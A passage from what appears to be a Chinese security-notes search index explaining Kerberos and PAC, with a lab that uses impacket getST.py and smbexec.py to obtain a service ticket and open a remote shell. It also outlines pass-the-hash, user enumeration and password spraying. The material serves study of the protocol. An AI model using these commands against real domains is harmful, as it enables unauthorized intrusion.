\u670d\u52a1\u7aef\u518d\u63a5\u6536\u5230\u5ba2\u6237\u8bf7\u6c42\u7684\u65f6\u5019\u4e0d\u518d\u9700\u8981\u501f\u52a9 KDC \u7684\u5e2e\u52a9\u63d0\u4f9b\u5b8c\u6574\u7684\u6388\u6743\u4fe1\u606f\u6765\u5b8c\u6210\u5bf9\u7528\u6237\u6743\u9650\u7684\u5224\u65ad\uff0c \u800c\u53ea\u9700\u8981\u6839\u636e\u8bf7\u6c42\u4e2d\u6240\u5305\u542b\u7684 PAC \u4fe1\u606f\u76f4\u63a5\u4e0e\u672c\u5730\u8d44\u6e90\u7684 ACL \u76f8\u6bd4\u8f83\u505a\u51fa\u88c1\u51b3\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article2/index.html#pac-kerberos","title":"PAC \u5728 kerberos \u4e2d\u7684\u4f18\u7f3a\u70b9","text":"<p>\u90a3\u4e48 PAC \u7684\u5b58\u5728\u7a76\u7adf\u7ed9\u6211\u4eec\u7684\u9a8c\u8bc1\u8fc7\u7a0b\u5e26\u6765\u4e86\u54ea\u4e9b\u4f18\u70b9\uff0c\u4ea6\u6216\u662f\u7f3a\u70b9\u5462\uff1f</p> <p>\u6b63\u5982\u4e0a\u9762\u6240\u63d0\u5230\u7684\u90a3\u6837\uff0cPAC \u7684\u5f15\u5165\u5176\u5b9e\u5e26\u6765\u4e86\u5f88\u591a\u7684\u4f18\u70b9\u3002\u5ba2\u6237\u7aef\u5728\u8bbf\u95ee\u7f51\u7edc\u8d44\u6e90\u7684\u65f6\u5019\u670d\u52a1\u7aef\u4e0d\u518d\u9700\u8981\u5411 KDC \u67e5\u8be2\u6388\u6743\u4fe1\u606f\uff0c \u800c\u662f\u76f4\u63a5\u5728\u672c\u5730\u8fdb\u884c PAC \u4fe1\u606f\u4e0e ACL \u7684\u6bd4\u8f83\u3002\u4ece\u800c\u8282\u7ea6\u4e86\u7f51\u7edc\u8d44\u6e90\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c \u5728\u6ca1\u6709 PAC \u7684\u60c5\u51b5\u4e0b\uff0cServer \u4e0e KDC \u4e4b\u95f4\u5fc5\u987b\u8fdb\u884c\u7528\u6237\u6388\u6743\u4fe1\u606f\u7684\u67e5\u8be2\u4e0e\u8fd4\u56de \uff1a</p> <p></p> <p>\u5f53\u5f15\u5165 PAC \u4e4b\u540e\u5219\u53d8\u6210\u4e86\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u4f46\u662f\uff0cPAC \u7684\u5f15\u5165\u5e76\u4e0d\u662f\u767e\u5229\u800c\u65e0\u4e00\u5bb3\u7684\uff0cPAC \u5728\u7528\u6237\u7684\u8ba4\u8bc1\u9636\u6bb5\u5f15\u5165\u4f1a\u5bfc\u81f4\u8ba4\u8bc1\u8017\u65f6\u8fc7\u957f\u3002Windows Kerberos \u5ba2\u6237\u7aef\u4f1a\u901a\u8fc7 RPC \u8c03\u7528 KDC \u4e0a\u7684\u51fd\u6570\u6765\u9a8c\u8bc1 PAC \u4fe1\u606f\uff0c\u8fd9\u65f6\u5019\u7528\u6237\u4f1a\u89c2\u5bdf\u5230\u5728\u670d\u52a1\u5668\u7aef\u4e0e KDC \u4e4b\u95f4\u7684 RPC \u5305\u6d41\u91cf\u7684\u589e\u52a0\u3002\u800c\u53e6\u4e00\u65b9\u9762\uff0c \u7531\u4e8e PAC \u662f\u5fae\u8f6f\u7279\u6709\u7684\u4e00\u4e2a\u7279\u6027\uff0c\u6240\u4ee5\u542f\u7528\u4e86 PAC \u7684\u57df\u4e2d\u5c06\u4e0d\u652f\u6301\u88c5\u6709\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u7684\u670d\u52a1\u5668\uff0c \u5236\u7ea6\u4e86\u57df\u914d\u7f6e\u7684\u7075\u6d3b\u6027\u3002\u5e76\u4e14\u5728 2014 \u5e74\uff0c\u7531\u4e8e PAC \u7684\u5b89\u5168\u6027\u5bfc\u81f4\u4ea7\u751f\u4e86\u4e00\u4e2a\u57df\u5185\u6781\u5176\u4e25\u91cd\u7684\u63d0\u6743\u6f0f\u6d1e <code>MS14-068</code></p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article2/index.html#kerberos_2","title":"Kerberos\u534f\u8bae\u6d41\u7a0b","text":"<p>\u5927\u81f4\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <p></p> <p>\u53c2\u4e0e\u7684\u89d2\u8272\u6709\uff1a</p> <ul> <li>Client: Application Client \u5e94\u7528\u5ba2\u6237\u7aef</li> <li>AS: Authentication Server \u7528\u6765\u8ba4\u8bc1\u7528\u6237\u8eab\u4efd,\u8ba4\u8bc1\u670d\u52a1\u5668\uff0c\u4e13\u95e8\u7528\u6765\u8ba4\u8bc1\u5ba2\u6237\u7aef\u7684\u8eab\u4efd\u5e76\u53d1\u653e\u5ba2\u6237\u7528\u4e8e\u8bbf\u95eeTGS\u7684TGT(\u7968\u636e\u6388\u4e88\u7968\u636e)</li> <li>TGS: Ticket-Granting Service \u7528\u6765\u6388\u6743\u670d\u52a1\u8bbf\u95ee,\u7968\u636e\u6388\u4e88\u670d\u52a1\u5668\uff0c\u7528\u6765\u53d1\u653e\u6574\u4e2a\u8ba4\u8bc1\u8fc7\u7a0b\u4ee5\u53ca\u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\u7aef\u65f6\u6240\u9700\u7684\u670d\u52a1\u6388\u4e88\u7968\u636e(ticket)</li> <li>SS: Service Server \u7528\u6237\u6240\u8bf7\u6c42\u7684\u670d\u52a1</li> <li>\u5ba2\u6237\u7aef(Client)\uff1a\u53d1\u9001\u8bf7\u6c42\u7684\u4e00\u65b9</li> <li>\u670d\u52a1\u7aef(Server)\uff1a\u63a5\u6536\u8bf7\u6c42\u7684\u4e00\u65b9</li> <li>\u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3(Key distribution KDC),\u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3\u53c8\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff0c\u5206\u522b\u662f\uff1aAS,TGS.</li> </ul> <p>Kerberos\u534f\u8bae\u7684\u5e94\u7528\u6d41\u7a0b\u53ef\u4ee5\u6982\u62ec\u4e3a\u4ee5\u4e0b\u51e0\u6b65:</p> <ol> <li>\u7528\u6237\u767b\u5f55\u57df\u5e76\u5411\u57df\u63a7\u5236\u5668\u7684\u8ba4\u8bc1\u670d\u52a1(AS)\u53d1\u9001\u7528\u6237\u540d\u4e0e\u57df\u540d,\u8bf7\u6c42 Ticket Granting Ticket(TGT)\u3002</li> <li>AS\u4f7f\u7528\u7528\u6237\u5bc6\u7801(\u6216NTLM\u54c8\u5e0c)\u8fdb\u884c\u52a0\u5bc6\u8fd0\u7b97,\u751f\u6210TGT\u5e76\u8fd4\u56de\u7528\u6237\u3002TGT\u4e2d\u5305\u542b\u7528\u6237\u4e0eTGS\u4e4b\u95f4\u7684\u4f1a\u8bdd\u5bc6\u94a5\u3002</li> <li>\u7528\u6237\u8bbf\u95ee\u5e94\u7528\u6216\u8d44\u6e90\u65f6,\u5411\u57df\u63a7\u5236\u5668\u7684\u7968\u8bc1\u6388\u4e88\u670d\u52a1(TGS)\u63d0\u4ea4TGT\u4ee5\u53ca\u5e94\u7528\u670d\u52a1\u5668\u7684ID,\u8bf7\u6c42\u670d\u52a1\u7968\u8bc1(ST)\u3002</li> <li>TGS\u9a8c\u8bc1TGT\u6709\u6548\u6027,\u4f7f\u7528TGT\u4e2d\u7684\u4f1a\u8bdd\u5bc6\u94a5\u5bf9\u7528\u6237\u4e0e\u5e94\u7528\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u65b0\u4f1a\u8bdd\u5bc6\u94a5\u52a0\u5bc6,\u751f\u6210ST\u5e76\u8fd4\u56de\u7528\u6237\u3002</li> <li>\u7528\u6237\u5411\u5e94\u7528\u670d\u52a1\u5668\u63d0\u4ea4ST\u4ee5\u9a8c\u8bc1\u8eab\u4efd\u3002\u5e94\u7528\u670d\u52a1\u5668\u4f7f\u7528TGS\u63d0\u4f9b\u7684\u4f1a\u8bdd\u5bc6\u94a5\u89e3\u5bc6ST,\u83b7\u53d6\u4f1a\u8bdd\u5bc6\u94a5\u5e76\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\u3002</li> <li>\u5e94\u7528\u670d\u52a1\u5668\u9488\u5bf9\u8be5\u7528\u6237\u7684\u8fd9\u6b21\u8bbf\u95ee\u751f\u6210\u8bbf\u95ee\u4ee4\u724c(Access Token),\u5e76\u5c06\u5176\u5305\u542b\u5728\u54cd\u5e94\u6d88\u606f\u8fd4\u56de\u7528\u6237\u3002</li> <li>\u7528\u6237\u968f\u540e\u6bcf\u6b21\u8bbf\u95ee\u5e94\u7528\u670d\u52a1\u5668\u90fd\u9700\u8981\u63d0\u4f9b Access Token \u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u5e94\u7528\u670d\u52a1\u5668\u89e3\u5bc6\u4ee4\u724c,\u4f7f\u7528\u4f1a\u8bdd\u5bc6\u94a5\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\u5e76\u5bf9\u8bf7\u6c42\u6388\u6743\u3002</li> <li>Access Token \u548c ST \u5728\u4e00\u5b9a\u65f6\u95f4\u540e\u8fc7\u671f,\u7528\u6237\u9700\u91cd\u65b0\u5411TGS\u7533\u8bf7\u65b0\u7684ST\u6765\u7ee7\u7eed\u8bbf\u95ee\u3002TGS\u53d1\u51fa\u65b0\u7684ST\u65f6\u4e5f\u91cd\u65b0\u751f\u6210\u4f1a\u8bdd\u5bc6\u94a5\u3002</li> <li>\u7528\u6237\u5b9a\u671f\u66f4\u6362\u5bc6\u7801\u65f6,\u6240\u6709TGT\u3001ST\u3001Access Token\u7b49\u4e5f\u968f\u4e4b\u65e0\u6548,\u7528\u6237\u9700\u91cd\u65b0\u8ba4\u8bc1\u5e76\u7533\u8bf7,\u4ee5\u786e\u4fdd\u5b89\u5168\u3002</li> </ol> <p>\u6253\u4e2a\u6bd4\u65b9\uff0c\u6574\u4e2a\u8fc7\u7a0b\u5c31\u662f\uff1a\u4f60\u60f3\u5750\u98de\u673a\uff0c\u4f46\u662f\u673a\u573a\u544a\u8bc9\u4f60\u5fc5\u987b\u6709\u673a\u7968\uff08TGT\uff09\u624d\u53ef\u4ee5\u767b\u673a\uff0c\u63a5\u7740\u4f60\u53bb\u8d2d\u7968\u5904\uff08AS\uff09\u51fa\u793a\u8eab\u4efd\u8bc1\uff08Client name\uff09\u8d2d\u4e70\u4e86\u4e00\u5f20\u673a\u7968\uff08TGT\uff09\uff0c\u4f60\u62ff\u7740\u673a\u7968\u767b\u673a\uff0c\u5728\u68c0\u7968\u5904\uff08TGS\uff09\u51fa\u793a\u673a\u7968\uff0c\u670d\u52a1\u4eba\u5458\u544a\u8bc9\u4e86\u4f60\u7684\u5ea7\u4f4d\u53f7\uff08Ticket\uff09\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u5750\u5230\u81ea\u5df1\u7684\u4f4d\u7f6e\u4e0a\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u51e0\u4e2a\u4f8b\u5b50\u6765\u5f62\u8c61\u7406\u89e3Kerberos\u534f\u8bae\u7684\u5e94\u7528\u6d41\u7a0b:</p> <ol> <li>TGT\u83b7\u53d6:\u8fd9\u5c31\u50cf\u5230\u7535\u5f71\u9662\u4e70\u7968,\u5148\u53bb\u552e\u7968\u5904\u4e70\u4e00\u5f20\u53ef\u4ee5\u89c2\u770b\u6240\u6709\u7535\u5f71\u7684\u901a\u7528\u7968\u3002TGT\u5c31\u50cf\u8fd9\u4e2a\u901a\u7528\u7535\u5f71\u7968,\u53ef\u4ee5\u8bbf\u95eeKerberos\u9886\u57df\u5185\u7684\u6240\u6709\u670d\u52a1\u3002</li> <li>ST\u7533\u8bf7:\u8fd9\u5c31\u50cf\u901a\u7528\u7968\u5141\u8bb8\u8fdb\u5165\u7535\u5f71\u9662,\u4f46\u6bcf\u4e2a\u7535\u5f71\u573a\u6b21\u90fd\u9700\u8981\u4e70\u5bf9\u5e94\u7684\u7535\u5f71\u7968\u65b9\u53ef\u5165\u573a\u3002ST\u5c31\u50cf\u89c2\u770b\u5404\u4e2a\u7535\u5f71\u7684\u95e8\u7968,\u6bcf\u4e2a\u670d\u52a1\u90fd\u9700\u8981\u5bf9\u5e94\u7684ST\u65b9\u53ef\u8bbf\u95ee\u3002</li> <li>\u4f1a\u8bdd\u5bc6\u94a5:\u8fd9\u5c31\u50cf\u7535\u5f71\u5f00\u59cb\u65f6\u653e\u6620\u5458\u4f1a\u53d1\u653e3D\u773c\u955c,\u53ea\u6709\u5e26\u4e0a\u7279\u5b9a\u7535\u5f71\u76843D\u773c\u955c\u624d\u80fd\u6b63\u5e38\u89c2\u770b\u3002Kerberos\u7684\u4f1a\u8bdd\u5bc6\u94a5\u5c31\u50cf3D\u773c\u955c,\u53ea\u6709\u4f7f\u7528\u6b63\u786e\u7684\u5bc6\u94a5\u624d\u80fd\u89e3\u5bc6\u901a\u4fe1\u5185\u5bb9\u3002</li> <li>\u66f4\u65b0\u673a\u5236:\u8fd9\u5c31\u50cf\u7535\u5f71\u9662\u4f1a\u5b9a\u671f\u66f4\u65b0\u7535\u5f71\u5217\u8868,\u65e7\u7968\u65e0\u6cd5\u4f7f\u7528;3D\u773c\u955c\u4e5f\u9700\u8981\u5b9a\u671f\u66f4\u6362\u3002Kerberos\u7684\u66f4\u65b0\u673a\u5236\u5c31\u50cf\u8fd9\u4e9b\u63aa\u65bd,\u53ef\u4ee5\u5b9a\u671f\u66f4\u65b0TGT\u3001ST\u3001\u4ee4\u724c\u7b49,\u4f7f\u8fc7\u671f\u4fe1\u606f\u65e0\u6cd5\u4f7f\u7528\u3002</li> <li>\u5bc6\u7801\u66f4\u6362:\u8fd9\u5c31\u50cf\u7535\u5f71\u9662\u6362\u7968\u7cfb\u7edf\u65f6\u9700\u8981\u89c2\u4f17\u5168\u90e8\u529e\u7406\u65b0\u7684\u4f1a\u5458\u5361\u3002Kerberos\u7684\u5bc6\u7801\u66f4\u6362\u4f1a\u4f7f\u4e4b\u524d\u7684\u8ba4\u8bc1\u4fe1\u606f\u5168\u90e8\u65e0\u6548,\u5fc5\u987b\u5168\u90e8\u91cd\u65b0\u7533\u8bf7\u3002</li> <li>\u7ec6\u7c92\u5ea6\u8bbf\u95ee\u63a7\u5236:\u8fd9\u5c31\u50cf\u4e0d\u540c\u7535\u5f71\u6709\u4e0d\u540c\u7684\u7968\u4ef7\u548c\u89c2\u4f17\u9650\u5236\u3002Kerberos\u4e3a\u6bcf\u4e2a\u670d\u52a1\u751f\u6210\u4e0d\u540c\u7684ST,\u5c31\u50cf\u6bcf\u4e2a\u7535\u5f71\u6709\u4e0d\u540c\u7684\u95e8\u7968,\u5b9e\u73b0\u4e86\u8be6\u7ec6\u7684\u8bbf\u95ee\u63a7\u5236\u3002</li> <li>\u5355\u70b9\u767b\u5f55:\u8fd9\u5c31\u50cf\u4f1a\u5458\u5361\u53ef\u4ee5\u89c2\u770b\u7535\u5f71\u9662\u5185\u5168\u90e8\u7535\u5f71\u3002TGT\u5b9e\u73b0\u4e86\u5355\u70b9\u767b\u5f55,\u4e00\u4e2a\u8ba4\u8bc1\u540e\u53ef\u4ee5\u8bbf\u95eeKerberos\u9886\u57df\u5185\u7684\u5168\u90e8\u670d\u52a1\u3002</li> </ol>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article2/index.html#kerberos_3","title":"Kerberos \u5b9e\u9a8c","text":"<p>\u4e3a\u4e86\u66f4\u76f4\u89c2\u7684\u5206\u6790 Kerberos \u534f\u8bae\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u7528\u666e\u901a\u57df\u5e10\u6237 xie/hack \u4f7f\u7528<code>impacket</code> \u5de5\u5177\u8bf7\u6c42 win10 \u673a\u5668\u7684 cifs \u670d\u52a1\u7968\u636e \uff0c\u7136\u540e\u8fdc\u7a0b SMB \u8fde\u63a5\uff0c\u5728\u8be5\u8fc7\u7a0b\u4e2d\u4f7f\u7528 WireShark \u8fdb\u884c\u6293\u5305\u3002</p> <p>\u5b9e\u9a8c\u73af\u5883\u5982\u4e0b\uff1a</p> <ul> <li>\u7528\u6237(xie/hack)\uff1a10.211.55.2</li> <li>\u57df\u5185\u4e3b\u673a(Win10)\uff1a 10.211.55.16</li> <li>\u57df\u63a7(AD01)\uff1a 10.211.55.4</li> </ul> <p>impacket \u4f7f\u7528\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>#\u4f7f\u7528 hack \u8d26\u53f7\u5bc6\u7801\u8bf7\u6c42 win10 \u7684 cifs \u670d\u52a1\u7684 ST \u670d\u52a1\u7968\u636e\npython3 getST.py -dc-ip 10.211.55.4 -spn cifs/win10.xie.com xie.com/hack:P@ss1234\n\n#\u5bfc\u5165\u8be5 ST \u670d\u52a1\u7968\u636e\nexport KRB5CCNAME=hack.ccache\n\n#\u4f7f\u7528 smb \u8fdc\u7a0b\u8fde\u63a5 win10\npython3 smbexec.py -no-pass -k win10.xie.com\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u5728\u8bf7\u6c42\u4e86\u670d\u52a1\u7968\u636e\u540e\uff0c\u6210\u529f\u8fdc\u7a0b SMB \u8fde\u63a5 win10 \u673a\u5668\u3002</p> <p></p> <p>\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 WireShark \u6293\u5305\uff0c\u6765\u8fdb\u4e00\u6b65\u7684\u5206\u6790 Kerberos \u534f\u8bae\u3002\u5982\u56fe\u6240\u793a\uff0c\u662f\u8be5\u8fc7\u7a0b\u7684\u6293\u5305\u56fe\uff1a</p> <p></p> <p>\u6574\u4e2a Kerberos \u8ba4\u8bc1\u6d41\u7a0b\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u4e0b\u9762\u6211\u4eec\u6765\u5177\u4f53\u5206\u6790 Kerberos \u8ba4\u8bc1\u6d41\u7a0b\u7684\u6bcf\u4e2a\u6b65\u9aa4\uff1a</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article2/index.html#as-req-as-rep","title":"AS-REQ &amp; AS-REP","text":"<p>\u6211\u4eec\u5148\u6765\u770b\u770b AS-REQ&amp;AS-REP \u8bf7\u6c42\u90e8\u5206\uff0c\u4e5f\u5c31\u662f WireShark \u6293\u7684\u7b2c\u4e00\u3001\u4e8c\u4e2a\u5305\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u4e00\u4e2a\u7b80\u6613\u7684 AS-REQ&amp;AS-REP \u8bf7\u6c42\u8fc7\u7a0b\u56fe\uff0c\u4fbf\u4e8e\u6211\u4eec\u76f4\u89c2\u7684\u4e86\u89e3AS-REQ&amp;AS-REP \u8bf7\u6c42\u8fc7\u7a0b\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article2/index.html#1as-req","title":"1.AS-REQ \u8bf7\u6c42\u5305\u5206\u6790","text":"<p>AS-REQ\uff1a\u5f53\u57df\u5185\u67d0\u4e2a\u7528\u6237\u60f3\u8981\u8bbf\u95ee\u57df\u5185\u67d0\u4e2a\u670d\u52a1\u65f6\uff0c\u4e8e\u662f\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u672c\u673a\u5c31\u4f1a\u5411 KDC \u7684 AS \u8ba4\u8bc1\u670d\u52a1\u53d1\u9001\u4e00\u4e2a AS-REQ \u8ba4\u8bc1\u8bf7\u6c42\u3002\u8be5\u8bf7\u6c42\u5305\u4e2d\u5305\u542b\u5982\u4e0b\u4fe1\u606f\uff1a</p> <p></p> <ul> <li>\u8bf7\u6c42\u7684\u7528\u6237\u540d(cname)\u3002</li> <li>\u57df\u540d(realm)\u3002</li> <li>Authenticator\uff1a\u4e00\u4e2a\u62bd\u8c61\u7684\u6982\u5ff5\uff0c\u4ee3\u8868\u4e00\u4e2a\u9a8c\u8bc1\u3002\u8fd9\u91cc\u662f\u7528\u6237\u5bc6\u94a5\u52a0\u5bc6\u7684\u65f6\u95f4\u6233\u3002</li> <li>\u8bf7\u6c42\u7684\u670d\u52a1\u540d(sname)\uff1aAS-REQ \u8fd9\u4e2a\u9636\u6bb5\u8bf7\u6c42\u7684\u670d\u52a1\u90fd\u662f krbtgt\u3002</li> <li>\u52a0\u5bc6\u7c7b\u578b(etype)\u3002</li> <li>\u4ee5\u53ca\u4e00\u4e9b\u5176\u4ed6\u4fe1\u606f\uff1a\u5982\u7248\u672c\u53f7\uff0c\u6d88\u606f\u7c7b\u578b\uff0c\u7968\u636e\u6709\u6548\u65f6\u95f4\uff0c\u662f\u5426\u5305\u542bPAC\uff0c\u534f\u5546\u9009\u9879\u7b49\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article2/index.html#2as-rep","title":"2.AS-REP \u56de\u590d\u5305\u5206\u6790","text":"<p>AS-REP\uff1a\u5f53 KDC \u7684 AS \u8ba4\u8bc1\u670d\u52a1\u63a5\u6536\u5230\u5ba2\u6237\u7aef\u53d1\u6765\u7684 AS-REQ \u8bf7\u6c42\u540e\uff0c\u4ece\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\u4e2d\u53d6\u51fa\u8be5\u7528\u6237\u7684\u5bc6\u94a5\uff0c\u7136\u540e\u7528\u8be5\u5bc6\u94a5\u5bf9\u8bf7\u6c42\u5305\u4e2d\u7684<code>Authenticator</code>\u9884\u8ba4\u8bc1\u90e8\u5206\u8fdb\u884c\u89e3\u5bc6\uff0c\u5982\u679c\u89e3\u5bc6\u6210\u529f\uff0c\u5e76\u4e14\u65f6\u95f4\u6233\u5728\u6709\u6548\u7684\u8303\u56f4\u5185\uff0c\u5219\u8bc1\u660e\u8bf7\u6c42\u8005\u63d0\u4f9b\u7684\u7528\u6237\u5bc6\u94a5\u6b63\u786e\u3002KDC \u7684 AS \u8ba4\u8bc1\u670d\u52a1\u5728\u6210\u529f\u8ba4\u8bc1\u5ba2\u6237\u7aef\u7684\u8eab\u4efd\u4e4b\u540e\uff0c\u53d1\u9001AS-REP \u54cd\u5e94\u5305\u7ed9\u5ba2\u6237\u7aef\u3002AS-REP \u54cd\u5e94\u5305\u4e2d\u4e3b\u8981\u5305\u62ec\u5982\u4e0b\u4fe1\u606f\uff1a</p> <p></p> <ul> <li>\u8bf7\u6c42\u7684\u7528\u6237\u540d(cname)\u3002</li> <li>\u57df\u540d(crealm)\u3002</li> <li>TGT \u8ba4\u8d2d\u6743\u8bc1\uff1a\u5305\u542b\u660e\u6587\u7684\u7248\u672c\u53f7\uff0c\u57df\u540d\uff0c\u8bf7\u6c42\u7684\u670d\u52a1\u540d\uff0c\u4ee5\u53ca\u52a0\u5bc6\u90e8\u5206enc-part\u3002\u52a0\u5bc6\u90e8\u5206\u7528 krbtgt \u5bc6\u94a5\u52a0\u5bc6\u3002\u52a0\u5bc6\u90e8\u5206\u5305\u542b<code>Logon SessionKey</code>\u3001\u7528\u6237\u540d\u3001\u57df\u540d\u3001\u8ba4\u8bc1\u65f6\u95f4\u3001\u8ba4\u8bc1\u5230\u671f\u65f6\u95f4\u548c <code>authorization-data</code>\u3002<code>authorization-data</code>\u4e2d\u5305\u542b\u6700\u91cd\u8981\u7684 PAC \u7279\u6743\u5c5e\u6027\u8bc1\u4e66(\u5305\u542b\u7528\u6237\u7684 RID\uff0c\u7528\u6237\u6240\u5728\u7ec4\u7684 RID) \u7b49\u3002</li> <li>enc_Logon Session Key\uff1a\u4f7f\u7528\u7528\u6237\u5bc6\u94a5\u52a0\u5bc6 <code>Logon Session Key</code> \u540e\u7684\u503c\uff0c\u5176\u4f5c\u7528\u662f\u7528\u4e8e\u786e\u4fdd\u5ba2\u6237\u7aef\u548c KDC \u4e0b\u9636\u6bb5\u4e4b\u95f4\u901a\u4fe1\u5b89\u5168\u3002\u4e5f\u5c31\u662f AS- REP \u4e2d\u6700\u5916\u5c42\u7684 <code>enc-part</code>\u3002</li> <li>\u4ee5\u53ca\u4e00\u4e9b\u5176\u4ed6\u4fe1\u606f\uff1a\u5982\u7248\u672c\u53f7\uff0c\u6d88\u606f\u7c7b\u578b\u7b49\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article2/index.html#tgs-req-tgs-rep","title":"TGS-REQ &amp; TGS-REP","text":"<p>\u6211\u4eec\u518d\u6765\u770b\u770b TGS-REQ&amp;TGS-REP \u8bf7\u6c42\u90e8\u5206\uff0c\u4e5f\u5c31\u662f WireShark \u6293\u7684\u7b2c\u4e09\u3001\u56db\u4e2a\u5305\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u4e00\u4e2a\u7b80\u6613\u7684 TGS-REQ&amp;TGS-REP \u8bf7\u6c42\u8fc7\u7a0b\u56fe\uff0c\u4fbf\u4e8e\u6211\u4eec\u76f4\u89c2\u7684\u4e86\u89e3 TGS-REQ&amp;TGS-REP \u8bf7\u6c42\u8fc7\u7a0b\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article2/index.html#kerberos_4","title":"Kerberos \u534f\u8bae\u7684\u5b89\u5168\u95ee\u9898","text":"<p>\u5728 AS-REQ \u8bf7\u6c42\u9636\u6bb5\uff0c\u662f\u7528\u7528\u6237\u5bc6\u7801 Hash \u6216 AES Key \u52a0\u5bc6\u7684\u65f6\u95f4\u6233\u3002\u56e0\u6b64\u5f53\u53ea\u83b7\u5f97\u4e86\u7528\u6237\u5bc6\u7801 Hash \u65f6\uff0c\u4e5f\u53ef\u4ee5\u53d1\u8d77 AS-REQ \u8bf7\u6c42\uff0c\u6240\u4ee5\u4e5f\u5c31\u9020\u6210\u4e86 PTH \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\uff1b\u5f53\u53ea\u83b7\u5f97\u7528\u6237\u5bc6\u7801\u7684 AES Key \u65f6\uff0c\u4e5f\u53ef\u4ee5\u53d1\u8d77 AS-REQ \u8bf7\u6c42\uff0c\u6240\u4ee5\u4e5f\u5c31\u9020\u6210\u4e86 PTK \u5bc6\u94a5\u4f20\u9012\u653b\u51fb\u3002</p> <p>\u800c AS-REQ \u8bf7\u6c42\u5305\u4e2d cname \u5b57\u6bb5\u7684\u503c\u4ee3\u8868\u7528\u6237\u540d\uff0c\u8fd9\u4e2a\u503c\u5b58\u5728\u548c\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de\u7684\u5305\u6709\u5dee\u5f02\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u4e8e\u679a\u4e3e\u57df\u5185\u7528\u6237\u540d\uff0c\u8fd9\u79cd\u653b\u51fb\u65b9\u5f0f\u88ab\u79f0\u4e3a \u57df\u5185\u7528\u6237\u679a\u4e3e\u653b\u51fb (\u5f53\u672a\u83b7\u53d6\u5230\u6709\u6548\u57df\u7528\u6237\u6743\u9650\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u679a\u4e3e\u57df\u5185\u7528\u6237)\u3002\u5e76\u4e14\u5f53\u7528\u6237\u540d\u5b58\u5728\uff0c\u5bc6\u7801\u6b63\u786e\u548c\u5bc6\u7801\u9519\u8bef\u65f6\uff0c\u8fd4\u56de\u7684\u5305\u4e5f\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u53ef\u4ee5\u8fdb\u884c\u7528\u6237\u540d\u5bc6\u7801\u7206\u7834\u3002\u4f46\u662f\u5728\u5b9e\u6218\u4e2d\uff0c\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u901a\u5e38\u90fd\u4f1a\u4f7f\u7528\u4e00\u79cd\u88ab\u79f0\u4e3a \u5bc6\u7801\u55b7\u6d12\uff08Password Spraying\uff09\u7684\u653b\u51fb\u65b9\u5f0f\u6765\u8fdb\u884c\u6d4b\u8bd5\u548c\u653b\u51fb\u3002\u5bf9\u5bc6\u7801\u8fdb\u884c\u55b7\u6d12\u5f0f\u7684\u653b\u51fb\uff0c\u8fd9\u4e2a\u53eb\u6cd5\u5f88\u5f62\u8c61\uff0c\u56e0\u4e3a\u5b83\u5c5e\u4e8e\u81ea\u52a8\u5316\u5bc6\u7801\u731c\u6d4b\u7684\u4e00\u79cd\u3002\u8fd9\u79cd\u9488\u5bf9\u6240\u6709\u7528\u6237\u7684\u81ea\u52a8\u5bc6\u7801\u55b7\u6d12\u901a\u5e38\u662f\u4e3a\u4e86\u907f\u514d\u5e10\u6237\u88ab\u9501\u5b9a\uff0c\u56e0\u4e3a\u9488\u5bf9\u540c\u4e00\u4e2a\u7528\u6237\u7684\u8fde\u7eed\u5bc6\u7801\u731c\u6d4b\u4f1a\u5bfc\u81f4\u5e10\u6237\u88ab\u9501\u5b9a\u3002\u6240\u4ee5\u53ea\u6709\u5bf9\u6240\u6709\u7528\u6237\u540c\u65f6\u6267\u884c\u7279\u5b9a\u7684\u5bc6\u7801\u767b\u5f55\u5c1d\u8bd5\uff0c\u624d\u80fd\u589e\u52a0\u7834\u89e3\u7684\u6982\u7387\uff0c\u6d88\u9664\u5e10\u6237\u88ab\u9501\u5b9a\u7684\u6982\u7387\u3002\u666e\u901a\u7684\u7206\u7834\u5c31\u662f\u7528\u6237\u540d\u56fa\u5b9a\uff0c\u7206\u7834\u5bc6\u7801\uff0c\